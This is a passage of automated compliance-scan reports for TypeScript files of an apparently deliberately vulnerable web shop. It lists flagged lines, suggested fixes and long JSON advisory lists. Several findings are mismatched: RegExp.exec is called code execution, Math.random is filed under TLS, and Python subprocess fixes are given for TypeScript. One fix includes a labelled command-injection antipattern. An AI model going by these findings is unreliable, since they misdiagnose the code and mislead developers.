[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/b2bOrder.ts`
**Scanned at**: 2026-10-11T16:33:14.004592+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 23 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 23
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [LOG-M-004](https://verify.example-org.internal/?id=LOG-M-004) | Trusted Time Synchronization for Security Events |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 23, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/datacreator.ts`
**Scanned at**: 2026-10-11T16:33:16.196130+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 305 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 305
for (let i = 0; i < length; i++) { text += possible.charAt(Math.floor(Math.random() * possible.length)) }
// Line 323
quantity: product.quantity ?? Math.floor(Math.random() * 70 + 30),
// Line 381
product.price = product.price ?? Math.floor(Math.random() * 9 + 1)
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SAST-M-006](https://verify.example-org.internal/?id=SAST-M-006) | Native Memory Safety and Unsafe Code Assurance |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [SECR-M-005](https://verify.example-org.internal/?id=SECR-M-005) | No Secrets in Build Logs |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 305, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `lib/codingChallenges.ts`
**Scanned at**: 2026-10-11T16:33:23.621497+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 76 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 76
if (new RegExp(`vuln-code-snippet vuln-line.*${challengeKey}`).exec(lines[i]) != null) {
// Line 78
} else if (new RegExp(`vuln-code-snippet neutral-line.*${challengeKey}`).exec(lines[i]) != null) {
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [IDOR-M-006](https://verify.example-org.internal/?id=IDOR-M-006) | Log Authorization Failures |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 76, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for 